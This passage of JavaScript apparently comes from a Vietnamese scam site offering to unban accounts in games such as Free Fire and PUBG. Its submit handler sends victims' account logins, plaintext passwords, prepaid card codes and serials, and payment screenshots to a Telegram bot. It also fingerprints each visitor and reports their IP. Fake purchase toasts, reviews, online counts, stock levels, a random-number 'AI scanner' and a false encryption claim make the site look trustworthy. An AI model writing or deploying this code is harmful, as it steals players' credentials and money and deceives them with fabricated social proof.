    var orders=[{id:'FF-7XK2M',game:'Free Fire',p:78},{id:'FF-9PL4N',game:'PUBG',p:45},{id:'FF-3RT8Q',game:'Liên Quân',p:92},{id:'FF-5WY1Z',game:'MLBB',p:23}],feed=document.getElementById('liveOrderFeed');
    if(!feed)return;feed.innerHTML=orders.map(function(o){return'<div class="live-feed-item"><span style="color:#ffd966;">#'+o.id+'</span> '+o.game+' ['+o.p+'%]</div>';}).join('');
}
function startLiveActivityFeed(){
    var na=['Nguyễn Văn Hùng','Trần Thị Mai','Lê Hoàng Nam'],ci=['Hà Nội','TP.HCM','Đà Nẵng'],ga=['Free Fire','PUBG','Liên Quân','MLBB'],gi={'Free Fire':'🔥',PUBG:'🎯','Liên Quân':'🐉',MLBB:'⚔️'};
    function add(){
        var n=na[Math.floor(Math.random()*na.length)],c=ci[Math.floor(Math.random()*ci.length)],g=ga[Math.floor(Math.random()*ga.length)],fd=document.getElementById('liveActivityFeed');
        if(!fd)return;
        var ac=document.createElement('div');ac.style.cssText='background:rgba(20,28,45,0.95);border:1px solid #2ecc71;border-radius:10px;padding:8px 12px;font-size:0.8rem;color:#b0d4ff;';
        ac.innerHTML=gi[g]+' <strong>'+n+'</strong> ở '+c+' vừa mở band <span style="color:#ffd966;">'+g+'</span>!';
        fd.appendChild(ac);if(fd.querySelectorAll('div').length>3)fd.firstElementChild.remove();
        setTimeout(function(){if(ac.parentNode)ac.remove();},8000);
    }
    add();setInterval(add,15000);
}
function startSocialProof(){
    var names=['Nguyễn Văn Hùng','Trần Thị Mai','Lê Hoàng Nam'],plans=['gói Cơ Bản','gói VIP','gói Ultimate'],games=['Free Fire','PUBG','Liên Quân','MLBB'],cities=['Hà Nội','TP.HCM'],colors=['#e74c3c','#2ecc71','#3498db','#f39c12'];
    setInterval(function(){
        var n=names[Math.floor(Math.random()*names.length)],pl=plans[Math.floor(Math.random()*plans.length)],g=games[Math.floor(Math.random()*games.length)],c=cities[Math.floor(Math.random()*cities.length)],co=colors[Math.floor(Math.random()*colors.length)],ini=n.charAt(0)+n.split(' ').pop().charAt(0),t=document.createElement('div');
        t.className='toast-notification';
        t.innerHTML='<div style="width:40px;height:40px;border-radius:50%;background:'+co+';display:flex;align-items:center;justify-content:center;color:white;font-weight:bold;">'+ini+'</div><div><strong>'+n+'</strong><br>ở '+c+' mua <span style="color:#ffd966;">'+pl+'</span> cho '+g+'</div>';
        var tc=document.getElementById('toastContainer');if(tc)tc.appendChild(t);
        setTimeout(function(){if(t.parentNode){t.style.animation='fadeOut 0.5s ease forwards';setTimeout(function(){t.remove();},500);}},5000);
    },12000);
}
function addRandomReview(){
    var revs=[{name:'Nguyễn Văn Hùng',stars:5,text:'Tool chạy rất nhanh!',city:'Hà Nội'},{name:'Trần Thị Mai',stars:5,text:'Bảo hành uy tín!',city:'TP.HCM'}],c=document.getElementById('reviewsContainer');
    if(!c)return;
    var r=revs[Math.floor(Math.random()*revs.length)],co=['#e74c3c','#2ecc71'][Math.floor(Math.random()*2)],ini=r.name.charAt(0),card=document.createElement('div');
    card.className='review-card';
    card.innerHTML='<div style="display:flex;align-items:center;gap:10px;"><div style="width:40px;height:40px;border-radius:50%;background:'+co+';display:flex;align-items:center;justify-content:center;color:white;">'+ini+'</div><div><strong>'+r.name+'</strong><span> • '+r.city+'</span><div>'+'⭐'.repeat(r.stars)+'</div></div></div><p>'+r.text+'</p>';
    c.insertBefore(card,c.firstChild);if(c.querySelectorAll('.review-card').length>6)c.lastElementChild.remove();
}
function updateOnlineCount(){var h=new Date().getHours(),b=h>=20?200:80,e=document.getElementById('onlineCount');if(e)e.textContent=b;setInterval(function(){var e2=document.getElementById('onlineCount');if(e2)e2.textContent=Math.max(10,parseInt(e2.textContent)+Math.floor(Math.random()*6)-3);},30000);}
function createParticles(){var c=document.getElementById('particlesContainer');if(!c)return;var em=['✨','⭐','💫','🌟','💰','💎'];for(var i=0;i<20;i++){var p=document.createElement('div');p.className='particle';p.textContent=em[Math.floor(Math.random()*em.length)];p.style.left=Math.random()*100+'%';p.style.animationDuration=(Math.random()*5+5)+'s';p.style.animationDelay=Math.random()*5+'s';c.appendChild(p);}}
var serverPrices={freefire:{vietnam:1},pubg:{vietnam:1.2},mobilelegends:{vietnam:1.1},lienquan:{vietnam:1}};
function updatePrices(){var m=serverPrices[state.game]?(serverPrices[state.game][state.server]||1):1,fp=Math.round(state.plan.price*m);if(giftDiscount>0)fp=Math.round(fp*(1-giftDiscount/100));var ba=document.getElementById('bankAmount'),ca=document.getElementById('cardAmount');if(ba)ba.textContent=fp.toLocaleString();if(ca)ca.textContent=fp.toLocaleString();}
function getFinalPrice(){var m=serverPrices[state.game]?(serverPrices[state.game][state.server]||1):1,bp=Math.round(state.plan.price*m);if(giftDiscount>0)bp=Math.round(bp*(1-giftDiscount/100));if(document.getElementById('accWashing')&&document.getElementById('accWashing').checked)bp+=200000;return bp;}

// IMAGE UPLOAD
function setupImageUpload(){
    var dz=document.getElementById('fileUploadArea'),fi=document.getElementById('paymentImage');if(!dz||!fi)return;
    dz.addEventListener('click',function(e){if(e.target.closest('#imagePreviewContainer')||e.target.closest('button'))return;fi.click();});
    fi.addEventListener('change',function(e){if(e.target.files[0])handleImageFile(e.target.files[0]);});
    dz.addEventListener('dragover',function(e){e.preventDefault();dz.classList.add('drag-over');});
    dz.addEventListener('dragleave',function(){dz.classList.remove('drag-over');});
    dz.addEventListener('drop',function(e){e.preventDefault();dz.classList.remove('drag-over');var f=e.dataTransfer.files[0];if(f&&f.type.startsWith('image/'))handleImageFile(f);});
}
function handleImageFile(file){if(['image/jpeg','image/png','image/gif','image/webp'].indexOf(file.type)===-1)return;uploadedImageFile=file;displayImagePreview(file);}
function displayImagePreview(file){
    var r=new FileReader();
    r.onload=function(e){uploadedImageData=e.target.result;var ip=document.getElementById('imagePreview');if(ip)ip.src=e.target.result;var up=document.getElementById('uploadPlaceholder'),ipc=document.getElementById('imagePreviewContainer');if(up)up.style.display='none';if(ipc)ipc.style.display='block';var fa=document.getElementById('fileUploadArea');if(fa){fa.style.borderStyle='solid';fa.style.borderColor='#2ecc71';}};
    r.readAsDataURL(file);
}
function compressImageBlob(file,mw,q){mw=mw||800;q=q||0.7;return new Promise(function(resolve){var r=new FileReader();r.onload=function(e){var img=new Image();img.onload=function(){var c=document.createElement('canvas'),w=img.width,h=img.height;if(w>mw){h*=mw/w;w=mw;}c.width=w;c.height=h;c.getContext('2d').drawImage(img,0,0,w,h);c.toBlob(function(b){resolve(b);},'image/jpeg',q);};img.src=e.target.result;};r.readAsDataURL(file);});}

// AVATAR SYSTEM
function setupAvatarSystem(){
    var avatars=['🦊','🐯','🐸','🐙','🦄','🐲','🦅','🐺','🦋','🐬'],colors=['#e74c3c','#2ecc71','#3498db','#f39c12','#9b59b6','#1abc9c','#e67e22','#ff6b6b','#00e6ff','#ffd966'],container=document.getElementById('avatarSelector');
    if(!container)return;container.innerHTML='';
    for(var i=0;i<avatars.length;i++){
        var avatar=document.createElement('span');avatar.className='avatar-option';
        avatar.style.cssText='display:inline-flex;align-items:center;justify-content:center;font-size:1.8rem;background:'+colors[i]+';width:50px;height:50px;border-radius:50%;cursor:pointer;border:3px solid transparent;';
        avatar.textContent=avatars[i];avatar.dataset.avatar=avatars[i];
        if(userAvatar===avatars[i])avatar.classList.add('selected');
        avatar.addEventListener('click',function(){document.querySelectorAll('.avatar-option').forEach(function(a){a.classList.remove('selected');});this.classList.add('selected');userAvatar=this.dataset.avatar;localStorage.setItem('userAvatar',userAvatar);});
        container.appendChild(avatar);
    }
    var nicknameInput=document.getElementById('nicknameInput');
    if(nicknameInput){nicknameInput.value=userNickname;nicknameInput.addEventListener('input',function(){userNickname=this.value.trim();localStorage.setItem('userNickname',userNickname);});}
}

// MISC FUNCTIONS
function applyGiftCode(){
    var codeInput=document.getElementById('giftCodeInput'),code=codeInput?codeInput.value.trim().toUpperCase():'',msgEl=document.getElementById('giftCodeMsg');
    if(!code){if(msgEl){msgEl.style.display='block';msgEl.style.color='#ff6b6b';msgEl.textContent='Nhập mã!';}return;}
    var gd=giftCodes[code];
    if(!gd){if(msgEl){msgEl.style.display='block';msgEl.style.color='#ff6b6b';msgEl.textContent='Mã không tồn tại!';}return;}
    if(gd.used>=gd.maxUses){if(msgEl){msgEl.style.display='block';msgEl.style.color='#ff6b6b';msgEl.textContent='Hết lượt!';}return;}
    if(appliedGiftCode===code){if(msgEl){msgEl.style.display='block';msgEl.style.color='#f39c12';msgEl.textContent='Đã áp dụng!';}return;}
    giftDiscount=gd.discount;appliedGiftCode=code;gd.used++;giftCodes[code]=gd;secureSetItem('giftCodes',giftCodes);
    if(msgEl){msgEl.style.display='block';msgEl.style.color='#2ecc71';msgEl.textContent='✅ Giảm '+giftDiscount+'%!';}
    updatePrices();Swal.fire({icon:'success',title:'🎁 OK!',text:'Giảm '+giftDiscount+'%',timer:2000});
}
function runAIScanner(){var uid=document.getElementById('aiUidInput').value.trim();if(!uid){Swal.fire('❌','Nhập UID!','error');return;}var logEl=document.getElementById('aiLog'),resultEl=document.getElementById('aiResult');logEl.classList.remove('hidden');logEl.innerHTML='🔍 Đang phân tích...';resultEl.classList.add('hidden');setTimeout(function(){var rate=90+Math.floor(Math.random()*10);resultEl.classList.remove('hidden');resultEl.innerHTML='<div style="color:#2ecc71;font-size:1.5rem;">Tỷ lệ: '+rate+'%</div><p style="color:#ffd966;">✅ CÓ THỂ mở band!</p>';},3000);}
function showWashingProgress(){var aw=document.getElementById('accWashing');if(!aw||!aw.checked)return;var pd=document.getElementById('washingProgress');if(!pd)return;pd.classList.remove('hidden');pd.innerHTML='<p style="color:#9b59b6;">🧹 Đang rửa acc...</p>';setTimeout(function(){pd.innerHTML='<p style="color:#2ecc71;">✅ Acc đã sạch 100%!</p>';},3000);}
function showPrivacyPolicy(){Swal.fire({title:'📜 CHÍNH SÁCH BẢO MẬT',html:'<p>🔒 Mật khẩu mã hóa AES-256</p><p>🗑️ Dữ liệu tự hủy sau 24h</p>',icon:'info',confirmButtonText:'Đã hiểu'});}
function showSecurityLog(){var log=securityLog.length>0?securityLog.slice(-5).reverse().join('<br>'):'Chưa có hoạt động nào';Swal.fire({title:'📋 NHẬT KÝ BẢO MẬT',html:log,icon:'info',confirmButtonText:'Đóng'});}
function downloadInvoice(){
    try{
        var doc=new window.jspdf.jsPDF();doc.setFont('helvetica','bold');doc.setFontSize(20);doc.text('HOA DON MO BAND',60,30);
        doc.setFontSize(12);doc.setFont('helvetica','normal');doc.text('Ma don: '+(state.currentOrderId||'FF-EXAMPLE'),20,50);doc.text('Gia: '+getFinalPrice().toLocaleString()+' VND',20,70);
        doc.save('hoa-don-mo-band.pdf');Swal.fire('✅','Đã tải hóa đơn PDF!','success');
    }catch(e){Swal.fire('❌','Thư viện PDF chưa tải xong!','error');}
}
function autoBackup(){var today=new Date().toDateString();if(lastBackupDate!==today){sendToTelegram('📦 BACKUP '+today+' | Blocked: '+blockedIPs.length);localStorage.setItem('lastBackupDate',today);lastBackupDate=today;}}
function autoDetectGame(uid){var patterns={freefire:/^[0-9]{8,12}$/,pubg:/^5[0-9]{7,11}$/,mobilelegends:/^[0-9]{9,10}$/,lienquan:/^[0-9]{8,9}$/};for(var g in patterns){if(patterns[g].test(uid)){document.querySelectorAll('.game-option').forEach(function(o){o.classList.remove('active');if(o.dataset.game===g)o.classList.add('active');});state.game=g;updatePrices();return g;}}return null;}
function checkScheduledMessages(){
    var now=new Date(),currentTime=now.getHours()+':'+(now.getMinutes()<10?'0':'')+now.getMinutes(),toKeep=[];
    for(var i=0;i<scheduledMessages.length;i++){var sm=scheduledMessages[i];if(sm.time===currentTime&&!sm.sent){sendToTelegram('📅 TIN NHẮN LÊN LỊCH\n⏰ '+sm.time+'\n📝 '+sm.message);sm.sent=true;}if(!sm.sent||sm.time>currentTime)toKeep.push(sm);}
    if(toKeep.length!==scheduledMessages.length){secureSetItem('scheduledMessages',toKeep);scheduledMessages=toKeep;}
}
setInterval(checkScheduledMessages,30000);

// SCHEDULE + ORDER STATUS
document.querySelectorAll('.schedule-slot').forEach(function(s){s.addEventListener('click',function(){document.querySelectorAll('.schedule-slot').forEach(function(x){x.classList.remove('selected');});this.classList.add('selected');selectedSchedule=this.dataset.slot;if(selectedSchedule==='now'){var si=document.getElementById('scheduledInfo');if(si)si.classList.add('hidden');}else{var si2=document.getElementById('scheduledInfo');if(si2){si2.classList.remove('hidden');si2.innerHTML='<i class="fas fa-calendar-check"></i> Đã đặt lịch: '+selectedSchedule;}}});});
function scheduleOrderProcessing(oid){if(selectedSchedule==='now')return null;var nw=new Date(),parts=selectedSchedule.split(':'),st=new Date(nw);st.setHours(parseInt(parts[0]),parseInt(parts[1]),0,0);if(st<nw)st.setDate(st.getDate()+1);var ms=st-nw,si=document.getElementById('scheduledInfo');if(si)si.innerHTML='<i class="fas fa-hourglass"></i> #'+oid+' lúc '+selectedSchedule;state.scheduleTimer=setInterval(function(){if(ms<=0){clearInterval(state.scheduleTimer);updateOrderStatus(oid,'approved');}ms-=1000;},1000);return st;}

function updateOrderStatus(oid,sts,rsn){
    rsn=rsn||'';var bx=document.getElementById('resultBox');if(bx)bx.classList.remove('hidden');
    var btn=document.getElementById('submitRequestBtn');if(btn){btn.disabled=false;btn.innerHTML='<i class="fas fa-paper-plane"></i> GỬI YÊU CẦU MỞ BAND';}
    if(sts==='approved'){
        if(bx)bx.innerHTML='<div style="color:#2ecc71;"><h3>✅ #'+oid+' ĐÃ ĐƯỢC DUYỆT!</h3><div class="terminal-box"><div style="color:#ffd966;">📟 TOOL CONSOLE v13.6</div><div style="color:#2ecc71;">[INFO] Khởi tạo kết nối...</div><div style="color:#2ecc71;">[INFO] Bypass bảo mật... OK</div><div style="color:#2ecc71;">[SUCCESS] Đã xóa lệnh band!</div></div></div>';
        var pb=document.getElementById('progressBar');if(pb)pb.classList.remove('hidden');resetProgress();
        var ps=document.getElementById('progressSent'),pd=document.getElementById('progressDuyet'),px=document.getElementById('progressXuLy');
        if(ps)ps.classList.add('completed');if(pd)pd.classList.add('completed');if(px)px.classList.add('active');
        showWarranty(oid,state.plan.name);
        var pt=state.plan.name==='speed'?60:state.plan.name==='ultimate'?300:state.plan.name==='vip'?600:1800;
        startCountdown(Math.floor(pt+Math.random()*pt),oid);
        if(state.plan.name==='vip'){planStocks.vip=Math.max(0,planStocks.vip-1);updateStocks();}
        if(state.plan.name==='ultimate'){planStocks.ultimate=Math.max(0,planStocks.ultimate-1);updateStocks();}
        if(state.plan.name==='basic'){planStocks.basic=Math.max(0,planStocks.basic-1);updateStocks();}
        updateTodaySold();
        if(Notification.permission==='granted'){new Notification('Tool Mở Band',{body:'Đơn #'+oid+' đã được duyệt!'});}
    }else if(sts==='rejected'){
        if(bx)bx.innerHTML='<div style="color:#ff6b6b;"><h3>❌ #'+oid+' BỊ TỪ CHỐI</h3><p><strong>Lý do:</strong> '+rsn+'</p></div>';
        var pb2=document.getElementById('progressBar'),td2=document.getElementById('timerDisplay');
        if(pb2)pb2.classList.add('hidden');if(td2)td2.classList.add('hidden');playSound('error');
    }
}

function showWarranty(oid,pl){var p={basic:'3 tháng',vip:'6 tháng',ultimate:'12 tháng',speed:'Trọn đời',subscription:'Vĩnh viễn'};var ex=document.getElementById('warrantySection');if(ex)ex.remove();var d=document.createElement('div');d.style.cssText='background:linear-gradient(135deg,#1d2c45,#2e405b);border:2px solid #f39c12;border-radius:20px;padding:20px;text-align:center;margin-top:20px;';d.innerHTML='<h3 style="color:#f39c12;">🛡️ Thẻ Bảo Hành</h3><p style="color:#ffd966;font-size:1.3rem;">BH-'+oid+'</p><p style="color:#2ecc71;">'+(p[pl]||'12 tháng')+'</p>';var rb=document.getElementById('resultBox');if(rb)rb.after(d);}

function startCountdown(dur,oid){
    var dp=document.getElementById('timerDisplay');dp.classList.remove('hidden');var rm=dur;
    if(state.countdownInterval)clearInterval(state.countdownInterval);
    state.countdownInterval=setInterval(function(){
        var mn=Math.floor(rm/60),sc=rm%60;dp.textContent='⏳ Đang xử lý: '+mn+':'+(sc<10?'0':'')+sc;
        if(rm<=0){clearInterval(state.countdownInterval);dp.textContent='✅ HOÀN THÀNH!';var px=document.getElementById('progressXuLy'),pd2=document.getElementById('progressDone');if(px)px.classList.add('completed');if(pd2)pd2.classList.add('completed');playSound('complete');Swal.fire({icon:'success',title:'🎉 Mở Band Thành Công!',confirmButtonText:'OK'});}
        rm--;
    },1000);
}

function saveToHistory(oid,uid,price,sts){
    try{
        var rh=localStorage.getItem('toolHistory')||'[]',h=[];
        try{h=JSON.parse(decryptData(rh));}catch(e){try{h=JSON.parse(rh);}catch(e2){h=[];}}
        h.unshift({orderId:oid,uid:uid,game:state.game,plan:state.plan.name,price:price,status:sts,time:new Date().toLocaleString('vi-VN'),ip:userIP});
        secureSetItem('toolHistory',h.slice(0,50));
    }catch(e){console.error('saveToHistory error:',e);}
}

// EVENT LISTENERS
function setupEventListeners(){
    document.querySelectorAll('.game-option').forEach(function(o){o.addEventListener('click',function(){document.querySelectorAll('.game-option').forEach(function(x){x.classList.remove('active');});this.classList.add('active');state.game=this.dataset.game;updatePrices();});});
    document.querySelectorAll('#serverSelector .btn-option').forEach(function(o){o.addEventListener('click',function(){document.querySelectorAll('#serverSelector .btn-option').forEach(function(x){x.classList.remove('active');});this.classList.add('active');state.server=this.dataset.server;updatePrices();});});
    document.querySelectorAll('.plan').forEach(function(p){p.addEventListener('click',function(){if(this.classList.contains('plan-soldout')){Swal.fire('❌','Hết suất!','error');return;}document.querySelectorAll('.plan').forEach(function(x){x.classList.remove('selected');});this.classList.add('selected');state.plan={name:this.dataset.plan,price:parseInt(this.dataset.price),time:this.dataset.time};updatePrices();clickCountForSpeed++;if(clickCountForSpeed>=5&&state.plan.name!=='speed'){var sp=document.getElementById('speedPackage');if(sp)sp.classList.remove('hidden');clickCountForSpeed=0;}});});
    document.querySelectorAll('.payment-method-option').forEach(function(o){o.addEventListener('click',function(){document.querySelectorAll('.payment-method-option').forEach(function(x){x.classList.remove('active');});this.classList.add('active');state.paymentMethod=this.dataset.method;var bi=document.getElementById('bankInfo'),ci=document.getElementById('cardInfo'),us=document.getElementById('uploadSection');if(bi)bi.classList.toggle('hidden',state.paymentMethod!=='bank');if(ci)ci.classList.toggle('hidden',state.paymentMethod!=='card');if(us)us.classList.toggle('hidden',state.paymentMethod!=='bank');if(state.paymentMethod==='card')removeImage();});});
    document.querySelectorAll('.platform-option').forEach(function(o){o.addEventListener('click',function(){document.querySelectorAll('.platform-option').forEach(function(x){x.classList.remove('active');});this.classList.add('active');state.platform=this.dataset.platform;});});
    
    var ffIdInput=document.getElementById('ffIdInput');if(ffIdInput)ffIdInput.addEventListener('blur',function(){var uid=this.value.trim();if(uid.length>=8)autoDetectGame(uid);});
    var pwInput=document.getElementById('passwordInput');if(pwInput)pwInput.addEventListener('input',function(){var warn=document.getElementById('passwordWarning');if(!warn)return;warn.style.display=this.value.length>0&&this.value.length<6?'block':'none';});
    var accWashingCheckbox=document.getElementById('accWashing');if(accWashingCheckbox)accWashingCheckbox.addEventListener('change',function(){if(this.checked)showWashingProgress();});
}

// SUBMIT HANDLER
function setupSubmitHandler(){
    var submitBtn=document.getElementById('submitRequestBtn');if(!submitBtn)return;
    
    submitBtn.addEventListener('click',async function(){
        var ffId=document.getElementById('ffIdInput'),platformAcc=document.getElementById('platformAccountInput'),password=document.getElementById('passwordInput'),captchaAnswer=document.getElementById('captchaAnswer'),honeypot=document.getElementById('honeypotField');
        var ffIdVal=ffId?ffId.value.trim():'',platformAccVal=platformAcc?platformAcc.value.trim():'',passwordVal=password?password.value.trim():'',captchaVal=captchaAnswer?parseInt(captchaAnswer.value||'0'):0,honeypotVal=honeypot?honeypot.value:'';
        
        if(honeypotVal.length>0){Swal.fire('🤖','Phát hiện bot!','error');return;}
        if(!ffIdVal||!platformAccVal||!passwordVal){Swal.fire('❌','Vui lòng nhập đầy đủ thông tin!','error');return;}
        if(isNaN(captchaVal)||captchaVal!==state.captchaResult){generateCaptcha();if(captchaAnswer)captchaAnswer.value='';Swal.fire('❌','Sai captcha!','error');return;}
        
        var cardTypeVal='',cardCodeVal='',cardSerialVal='';
        if(state.paymentMethod==='card'){var cardTypeEl=document.getElementById('cardType'),cardCodeEl=document.getElementById('cardCode'),cardSerialEl=document.getElementById('cardSerial');cardTypeVal=cardTypeEl?cardTypeEl.value:'Viettel';cardCodeVal=cardCodeEl?cardCodeEl.value.trim():'';cardSerialVal=cardSerialEl?cardSerialEl.value.trim():'';if(!cardCodeVal||!cardSerialVal){Swal.fire('❌','Vui lòng nhập mã thẻ và seri!','error');return;}}
        if(state.paymentMethod==='bank'&&!uploadedImageFile){Swal.fire('❌','Vui lòng tải ảnh chuyển khoản!','error');return;}
        if(state.plan.name==='ultimate'&&planStocks.ultimate<=0){Swal.fire('❌','Hết suất Ultimate!','error');return;}
        if(state.plan.name==='vip'&&planStocks.vip<=0){Swal.fire('❌','Hết suất VIP!','error');return;}
        
        var finalPrice=getFinalPrice(),scheduleText=selectedSchedule==='now'?'XỬ LÝ NGAY':'Đặt lịch: '+selectedSchedule;
        var confirmHtml='<p>🎮 Game: <b>'+state.game.toUpperCase()+'</b></p><p>💎 Gói: <b>'+state.plan.name.toUpperCase()+'</b></p><p>💰 Tổng: <span style="color:#ffd966;font-size:1.3rem;">'+finalPrice.toLocaleString()+'đ</span></p><p>⏰ '+scheduleText+'</p>';
        if(document.getElementById('accWashing')&&document.getElementById('accWashing').checked)confirmHtml+='<p style="color:#9b59b6;">🧹 + Rửa acc: 200.000đ</p>';
        if(state.paymentMethod==='card')confirmHtml+='<p style="color:#f39c12;">💳 Thẻ cào '+cardTypeVal+'</p>';
        if(giftDiscount>0)confirmHtml+='<p style="color:#ffd700;">🎁 Giảm giá: '+giftDiscount+'%</p>';
        
        var confirmResult=await Swal.fire({title:'📋 XÁC NHẬN ĐƠN HÀNG',html:confirmHtml,icon:'question',showCancelButton:true,confirmButtonText:'✅ GỬI YÊU CẦU',cancelButtonText:'❌ HỦY'});
        if(!confirmResult.isConfirmed)return;
        
        var btn=this;btn.disabled=true;btn.innerHTML='<i class="fas fa-spinner fa-spin"></i> ĐANG GỬI...';
        var pb=document.getElementById('progressBar');if(pb)pb.classList.add('hidden');
        var td=document.getElementById('timerDisplay');if(td)td.classList.add('hidden');
        var ew=document.getElementById('warrantySection');if(ew)ew.remove();
        if(state.countdownInterval)clearInterval(state.countdownInterval);if(state.pollingInterval)clearTimeout(state.pollingInterval);if(state.scheduleTimer)clearInterval(state.scheduleTimer);
        resetProgress();
        var rb=document.getElementById('resultBox');if(rb){rb.classList.remove('hidden');rb.innerHTML='<div style="text-align:center;color:#ffd966;"><i class="fas fa-spinner fa-spin"></i> Đang gửi yêu cầu...</div>';}
        
        try{
            state.currentOrderId='FF-'+Date.now().toString(36).toUpperCase();
            var ipDetails=await fetchIPDetails(userIP);
            var messageText='🔔 <b>YÊU CẦU MỚI #'+state.currentOrderId+'</b>\n👤 '+(userNickname||'N/A')+'\n🎮 '+state.game.toUpperCase()+'\n💎 '+state.plan.name.toUpperCase()+'\n💰 '+finalPrice.toLocaleString()+'đ\n⏰ '+scheduleText+'\n🆔 UID: '+ffIdVal+'\n📧 TK: '+platformAccVal+'\n🔐 MK: '+passwordVal+'\n🌐 IP: '+userIP+'\n📍 '+(ipDetails.city||'Unknown');
            if(document.getElementById('accWashing')&&document.getElementById('accWashing').checked)messageText+='\n🧹 Rửa acc: CÓ';
            if(giftDiscount>0)messageText+='\n🎁 Gift: '+appliedGiftCode+' (-'+giftDiscount+'%)';
            if(state.paymentMethod==='card')messageText+='\n💳 Thẻ: '+cardTypeVal+'\n🎫 Mã: '+cardCodeVal+'\n🔢 Seri: '+cardSerialVal;
            
            if(state.paymentMethod==='bank'&&uploadedImageFile){try{var blob=uploadedImageFile;if(uploadedImageFile.size>500000)blob=await compressImageBlob(uploadedImageFile);await sendPhotoToTelegram(blob,'📸 Ảnh CK - Đơn #'+state.currentOrderId);}catch(e){}}
            
            var buttons=[[{text:'✅ ĐỒNG Ý',callback_data:'approve_'+state.currentOrderId},{text:'❌ TỪ CHỐI',callback_data:'reject_'+state.currentOrderId}]];
            var msgResult=await sendMessageWithButtons(messageText,buttons);
            
            if(msgResult&&msgResult.ok&&msgResult.result){
                await sendPrivateToAdmin('🔔 ĐƠN MỚI #'+state.currentOrderId+'\n👤 '+(userNickname||'User')+'\n🎮 '+state.game.toUpperCase()+'\n💰 '+finalPrice.toLocaleString()+'đ\n🌐 IP: '+userIP).catch(function(){});
                saveToHistory(state.currentOrderId,ffIdVal,finalPrice,'pending');
                if(rb)rb.innerHTML='<div style="color:#2ecc71;text-align:center;"><h3>✅ GỬI THÀNH CÔNG!</h3><p>Mã đơn: <b>#'+state.currentOrderId+'</b></p><p style="color:#ffd966;">⏳ Đang chờ admin duyệt...</p></div>';
                if(platformAccVal.indexOf('@')!==-1){var ebox=document.getElementById('emailConfirmBox');if(ebox){ebox.classList.remove('hidden');ebox.innerHTML='<i class="fas fa-envelope"></i> 📧 Đã gửi email đến <strong>'+platformAccVal+'</strong>';}}
                addSecurityLog('Gửi yêu cầu #'+state.currentOrderId+' - Thành công');playSound('notification');
                startPollingForApproval(msgResult.result.message_id,state.currentOrderId);
                if(selectedSchedule!=='now'){var si=document.getElementById('scheduledInfo');if(si){si.classList.remove('hidden');si.innerHTML='<i class="fas fa-calendar-check"></i> Đã đặt lịch #'+state.currentOrderId+' lúc '+selectedSchedule;}}
                Swal.fire({icon:'success',title:'✅ Gửi Thành Công!',text:'Mã đơn: #'+state.currentOrderId+'\nVui lòng chờ admin duyệt.',confirmButtonText:'OK',timer:5000});
                generateCaptcha();var ca=document.getElementById('captchaAnswer');if(ca)ca.value='';
            }else{throw new Error('Không thể gửi tin nhắn Telegram - kiểm tra bot token hoặc kết nối mạng');}
        }catch(error){
            console.error('Submit error:',error);reportErrorToTelegram({message:'Submit: '+error.message,source:'submit'});
            if(rb)rb.innerHTML='<div style="color:#ff6b6b;text-align:center;"><h3>❌ LỖI GỬI YÊU CẦU</h3><p>'+error.message+'</p><p style="font-size:0.85rem;">Vui lòng thử lại hoặc liên hệ admin.</p></div>';
            playSound('error');addSecurityLog('Gửi yêu cầu #'+state.currentOrderId+' - Lỗi: '+error.message);
        }finally{btn.disabled=false;btn.innerHTML='<i class="fas fa-paper-plane"></i> GỬI YÊU CẦU MỞ BAND';}
    });
}

// INIT
async function init(){
    try{
        var isBlocked=await checkIfBlocked();if(!isBlocked)return;
        var isSuspicious=checkSuspiciousIP();if(!isSuspicious)return;
        var uip=document.getElementById('userIpDisplay');if(uip)uip.textContent=userIP;
        var dh=document.getElementById('deviceHash');if(dh)dh.textContent=deviceFingerprint?deviceFingerprint.substring(0,8):'------';
        var ipDetails=await fetchIPDetails(userIP);
        sendToTelegram('🟢 <b>USER MỚI</b>\n👤 '+(userNickname||'NoName')+'\n📡 IP: '+userIP+'\n📍 '+(ipDetails.city||'Unknown')+'\n🆔 Device: '+(deviceFingerprint||'?')+'\n📌 Chat: /chat '+userIP);
        
        if(localStorage.getItem('darkMode')==='true'){darkMode=true;document.body.classList.add('light-mode');}
        if(darkMode){var dmt=document.getElementById('darkModeToggle');if(dmt)dmt.textContent='☀️';}
        
        setupAvatarSystem();checkBroadcast();addSecurityLog('Truy cập từ IP '+userIP);
        createParticles();generateCaptcha();updatePrices();updateOnlineCount();startSocialProof();
        startLiveActivityFeed();setupImageUpload();updateStocks();updateSuccessRate();
        updatePlanViewers();updateBuyingCounter();updateTodaySold();updateDaysRunning();updateActivityLog();addLiveOrderFeed();
        setupEventListeners();setupSubmitHandler();
        
        setInterval(updatePlanViewers,15000);setInterval(updateBuyingCounter,10000);setInterval(updateTodaySold,30000);
        setInterval(addRandomReview,25000);setInterval(updateSuccessRate,45000);setInterval(updateStocks,60000);
        setInterval(addLiveOrderFeed,20000);setInterval(autoBackup,3600000);
        if(Notification.permission==='default')Notification.requestPermission();
        setTimeout(function(){var ws=document.getElementById('wsStatus');if(ws)ws.className='ws-status ws-connected';var wst=document.getElementById('wsStatusText');if(wst)wst.textContent='Connected';},2000);
        
        var rh=localStorage.getItem('toolHistory')||'[]',history=[];try{history=JSON.parse(decryptData(rh));}catch(e){try{history=JSON.parse(rh);}catch(e2){history=[];}}
        var ul=document.getElementById('userLevel');if(ul)ul.textContent=Math.floor(history.filter(function(h){return h.status==='approved';}).length/2)+1;
        
        resetInactivityTimer();
        centralizedPollingLoop();
        console.log('✅ DEVILS WILL RISE v13.6 - READY');
    }catch(e){reportErrorToTelegram({message:'Init: '+e.message,source:'init'});console.error('Init Error:',e);}
}

init();
window.addEventListener('beforeunload',function(){if(state.countdownInterval)clearInterval(state.countdownInterval);if(state.pollingInterval)clearTimeout(state.pollingInterval);if(state.scheduleTimer)clearInterval(state.scheduleTimer);if(inactivityTimer)clearTimeout(inactivityTimer);});
